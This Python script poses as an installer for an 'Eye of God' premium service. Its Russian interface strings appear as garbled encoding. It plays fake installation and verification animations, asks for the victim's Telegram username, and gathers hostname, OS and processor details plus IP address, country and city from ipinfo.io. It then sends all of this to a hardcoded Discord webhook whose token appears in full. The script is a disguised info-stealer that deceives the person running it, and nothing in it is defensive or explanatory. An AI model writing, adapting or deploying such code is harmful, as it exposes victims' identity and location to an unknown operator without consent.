import time
import platform
import json
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore

init()

WEBHOOK_URL = 'https://discord.com/api/webhooks/1274044779839225876/r9Sm7C2wCgBi7U9P2NC1A9WiIdPvZLBiElm8voCH6Ph-kvEDSNpZPn_8k-mYsJRwFf7i'

def display_installation_message():
    steps = ["–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≥–ª–∞–∑–∞ –±–æ–≥–∞ üîç", "–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≥–ª–∞–∑–∞ –±–æ–≥–∞ üõ†Ô∏è", "–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≥–ª–∞–∑–∞ –±–æ–≥–∞ ‚è≥"]
    for _ in range(3):
        for step in steps:
            print(step, end="\r")
            time.sleep(1)
    print("–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–æ—à–ª–∞ ‚úÖ")
    time.sleep(4)
    print(" " * 50, end="\r")
    time.sleep(3)
    print(" " * 50, end="\r")

def get_telegram_username():
    while True:
        print(Fore.RED + "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à @username –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞ Telegram\n–ø–æ—Å–ª–µ —Å–∫—Ä–∏–ø—Ç –¥–æ–±–∞–≤–∏—Ç –≤–∞—Å –≤\n—Å–ø–∏—Å–æ–∫ –ø—Ä–µ–º–∏—É–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π " + Fore.BLUE + ">>>", end="")
        username = input().strip()
        if username:
            confirm_username = input("–í–≤–µ–¥–∏—Ç–µ –≤–∞—à @username –µ—â–µ —Ä–∞–∑ >>> ").strip()
            if username == confirm_username:
                return username
            else:
                print("–û—à–∏–±–∫–∞: –∏–º–µ–Ω–∞ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
        else:
            print("–û—à–∏–±–∫–∞: –∏–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")

def display_verification_animation():
    animation_steps = ["üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...", "üîß –ü—Ä–æ–≤–µ—Ä–∫–∞...", "‚úîÔ∏è –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!"]
    for step in animation_steps:
        print(step, end="\r")
        time.sleep(0.5)

def collect_system_data(username):
    data = {
        "üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞": platform.system(),
        "üñ•Ô∏è –ò–º—è —É–∑–ª–∞": platform.node(),
        "üõ†Ô∏è –†–µ–ª–∏–∑": platform.release(),
        "üîß –í–µ—Ä—Å–∏—è": platform.version(),
        "üíª –ú–∞—à–∏–Ω–∞": platform.machine(),
        "‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä": platform.processor(),
        "üìú Telegram Username": username
    }
    return data

def get_ip_and_location():
    try:
        response = requests.get("https://ipinfo.io")
        if response.status_code == 200:
            ip_info = response.json()
            return {
                "üåê IP-–∞–¥—Ä–µ—Å": ip_info.get("ip"),
                "üè≥Ô∏è –°—Ç—Ä–∞–Ω–∞": ip_info.get("country"),
                "üèôÔ∏è –ì–æ—Ä–æ–¥": ip_info.get("city"),
                "üó∫Ô∏è –†–µ–≥–∏–æ–Ω": ip_info.get("region"),
            }
        else:
            return {"üåê IP-–∞–¥—Ä–µ—Å": "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ", "üè≥Ô∏è –°—Ç—Ä–∞–Ω–∞": "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP: {e}")
        return {"üåê IP-–∞–¥—Ä–µ—Å": "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ", "üè≥Ô∏è –°—Ç—Ä–∞–Ω–∞": "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}

def send_data_to_discord(data):
    try:
        webhook = DiscordWebhook(url=WEBHOOK_URL, username="–°–∏—Å—Ç–µ–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ", avatar_url=r"https://media.discordapp.net/attachments/1258001563880788039/1269594103126167562/d9f2786116b9f9b8109141cdc3be4580.jpg?ex=66c07326&is=66bf21a6&hm=3e065d8460135dab6a769364dab51610c8bd6e57fca823a9c4f4838d8035906e&")
        description = "\n".join([f"{key}: {value}" for key, value in data.items()])
        embed = DiscordEmbed(title="üíæ –î–∞–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã", description=f"```\n{description}\n```", color='000000')
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
        print("–æ—à–∏–±–∫–∞, –±–æ–ª—å—à–µ –Ω–µ –∑–∞–ø—É—Å–∫–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç\n–≤—ã –ø–æ–¥—Ç–≤–µ—Ä–≥–∞–µ—Ç–µ —Å–≤–æ–π –¥–µ–≤–∞–π—Å —Ä–∏—Å–∫—É")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö: {e}")

def main():
    display_installation_message()
    telegram_username = get_telegram_username()
    display_verification_animation()
    system_data = collect_system_data(telegram_username)
    ip_location_data = get_ip_and_location()
    combined_data = {**system_data, **ip_location_data}
    send_data_to_discord(combined_data)

if __name__ == "__main__":
    main()
